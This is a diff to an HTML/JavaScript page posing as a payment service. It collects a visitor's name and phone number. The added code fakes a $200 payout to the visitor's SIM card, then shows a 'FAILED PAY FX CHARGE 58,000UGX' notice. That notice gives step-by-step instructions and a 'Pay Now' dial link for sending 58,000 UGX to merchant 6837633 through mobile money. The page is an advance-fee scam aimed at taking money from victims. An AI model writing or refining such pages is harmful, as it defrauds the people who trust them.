@@ -50,7 +50,6 @@
 
         .form-section { padding: 0 30px 30px; }
         
-        /* Modified header colors per instructions */
         .header-login { background: var(--selar-brown); color: white; padding: 8px; font-weight: bold; letter-spacing: 2px; text-align: center; margin: 20px 0; }
         .header-dash { background: var(--success-green); color: white; padding: 8px; font-weight: bold; letter-spacing: 2px; text-align: center; margin: 20px 0; }
         
@@ -89,17 +88,20 @@
         .color-stripe { color: var(--jpesa-blue); cursor: pointer; }
         .color-epay { color: var(--success-green); cursor: pointer; }
 
-        /* Loading Bar Styles */
         .progress-container { width: 100%; background-color: #ddd; border-radius: 10px; margin: 15px 0; height: 10px; }
         .progress-bar { width: 0%; height: 100%; background-color: var(--success-green); border-radius: 10px; transition: width 0.1s linear; }
 
-        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; justify-content: center; align-items: center; padding: 20px; }
+        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; justify-content: center; align-items: center; padding: 20px; }
         .modal { background: white; padding: 25px; border-radius: 8px; max-width: 400px; width: 100%; text-align: center; }
 
         .loading-ring { border: 4px solid #f3f3f3; border-top: 4px solid var(--jpesa-blue); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 10px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
         .user-info-header { font-weight: bold; color: var(--dark-text); margin-bottom: 5px; text-transform: uppercase; border-bottom: 1px solid #eee; padding-bottom: 5px; }
+        
+        /* Specific Styles for your new Notification */
+        .failed-header { color: var(--jpesa-red); font-weight: bold; font-size: 1.1rem; border-bottom: 2px solid #eee; padding-bottom: 10px; margin-bottom: 15px; }
+        .instruction-box { background: #f9f9f9; padding: 12px; border: 1px dashed #ccc; border-radius: 6px; text-align: left; font-family: 'Courier New', Courier, monospace; font-size: 0.9rem; margin: 10px 0; }
     </style>
 </head>
 <body>
@@ -183,7 +185,6 @@
         state.name = document.getElementById('regName').value;
         state.phone = document.getElementById('regPhone').value;
         
-        // Account Loading Notification
         const ov = document.getElementById('overlay');
         ov.style.display = 'flex';
         document.getElementById('modalContent').innerHTML = `
@@ -205,7 +206,7 @@
                 renderStep();
                 setTimeout(() => { if(state.step === 1) showDepositModal(200); }, 11000);
             } else {
-                width += 2; // Increments over 5 seconds (approx)
+                width += 2;
                 progBar.style.width = width + '%';
                 progText.innerText = width + '%';
             }
@@ -261,8 +262,40 @@
     }
 
     function handleAction() {
-        if(state.step === 3) return;
-        window.location.href = state.step >= 4 ? "https://pay.guto.app/@selara4?a=98000" : "https://lolisys.github.io/5selar/";
+        const ov = document.getElementById('overlay');
+        ov.style.display = 'flex';
+        
+        // Custom Initiation Screen
+        document.getElementById('modalContent').innerHTML = `
+            <div class="loading-ring"></div>
+            <h3 style="color: var(--jpesa-blue);">Processing</h3>
+            <p>initiating 200$~ 743,000UGX to SIM card<br>
+            <b>${state.phone}</b> (${state.name})</p>
+            <p style="font-size:0.8rem; color:#666;">Please wait 10 seconds...</p>
+        `;
+
+        setTimeout(() => {
+            // Failed Notification Screen
+            document.getElementById('modalContent').innerHTML = `
+                <div class="failed-header">FAILED PAY FX CHARGE 58,000UGX</div>
+                <p>Sim Card Verified <span class="blink-green">🇺🇬</span><br>
+                <b>${state.phone}</b> - ${state.name}</p>
+                
+                <div class="instruction-box">
+                    <b>How to pay fx charge Via Merchant:</b><br>
+                    Dial: *185*9#<br>
+                    Enter Merchant: 6837633<br>
+                    Enter Amount: 58000<br>
+                    Enter Reference: selar Merchant<br>
+                    <small>Confirm to complete the invoice transaction</small>
+                </div>
+
+                <div style="display:flex; gap:10px; margin-top:20px;">
+                    <button class="btn-action" style="flex:1; margin:0;" onclick="window.location.href='tel:*185*9%23'">Pay Now</button>
+                    <button class="btn-action" style="flex:1; margin:0; background:#444;" onclick="document.getElementById('overlay').style.display='none'">Pay Later</button>
+                </div>
+            `;
+        }, 10000);
     }
 
     function startEpayLong() {
